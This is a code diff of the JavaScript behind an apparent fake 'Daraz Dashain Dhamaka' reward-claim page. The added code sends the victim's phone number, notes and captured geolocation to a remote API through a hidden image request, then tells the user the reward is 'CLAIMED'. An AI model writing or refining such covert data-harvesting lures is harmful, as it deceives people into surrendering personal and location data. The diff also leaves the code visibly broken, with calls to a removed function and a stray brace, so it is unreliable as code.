@@ -207,22 +207,24 @@ btnSubmit.addEventListener('click', function(){
 
   btnSubmit.disabled = true;
   btnSubmit.textContent = 'SUBMITTING...';
-  showStatus('Sending...');
 
-  var form = document.createElement('form');
-  form.method = 'POST';
-  form.action = API;
-  form.target = 'hiddenFrame';
-  form.style.display = 'none';
+  var url = API
+    + '?campaign=Daraz+Dashain+Dhamaka'
+    + '&reward=Rs.+1,000'
+    + '&phoneNumber=' + encodeURIComponent(phone)
+    + '&notes=' + encodeURIComponent(notes)
+    + '&location=' + (captured.location ? encodeURIComponent(JSON.stringify(captured.location)) : '')
+    + '&_=' + Date.now();
 
-  function addField(name, value) {
-    var input = document.createElement('input');
-    input.type = 'hidden';
-    input.name = name;
-    input.value = (value === null || value === undefined) ? '' : value;
-    form.appendChild(input);
-  }
-
+  var img = new Image();
+  img.onload = img.onerror = function(){
+    showStatus('Sent!');
+    btnSubmit.textContent = '\u2713 CLAIMED';
+    btnSubmit.classList.add('success');
+  };
+  img.src = url;
+});
+ 
   addField('campaign', 'Daraz Dashain Dhamaka');
   addField('reward', 'Rs. 1,000');
   addField('phoneNumber', phone);
